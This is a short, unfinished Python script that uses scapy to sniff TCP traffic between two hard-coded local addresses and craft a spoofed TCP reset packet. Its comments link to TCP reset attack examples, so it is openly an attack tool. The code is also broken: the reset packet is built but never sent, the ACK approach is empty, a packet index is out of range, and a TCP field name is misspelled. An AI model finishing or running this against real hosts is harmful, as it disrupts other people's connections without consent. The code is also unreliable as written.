
from scapy.all import *

WINDOWS_SIZE = 512
tcp_rst_count = 10

def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):

    #ERROR CHECK ADDRESSER
    print(f"dst host {dest_addr} and src host {source_addr}")

    sniffed_packages = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 5)
    #sniffed_package = sniff(filter = f"tcp", count = 5)
    package_sample = sniffed_packages[5] # latest packet
    #package_sample1 = sniffed_packages[1]


    print(package_sample[TCP].ack)
    #print(package_sample1[TCP].ack)


    if approach == "ACK":
        pass
    elif approach == "RST":
        # seqs = range(package_sample[TCP].seq, max_seq, int(win / 2))

        dst_port = package_sample[TCP].dport
        src_port = package_sample[TCP].sport
        rst_package = IP(src = source_addr, dst = dest_addr) / TCP(sport = src_port, dport = dst_port, flag = "R")
    else:
        raise ValueError("Incorrect or invalid approach")


def main():
    
    tcp_throttling("192.168.0.116", "192.168.0.128", "RST")
    

if __name__ == "__main__":
    main()

## https://github.com/robert/how-does-a-tcp-reset-attack-work/blob/master/main.py
## https://gist.github.com/spinpx/263a2ed86f974a55d35cf6c3a2541dc2
        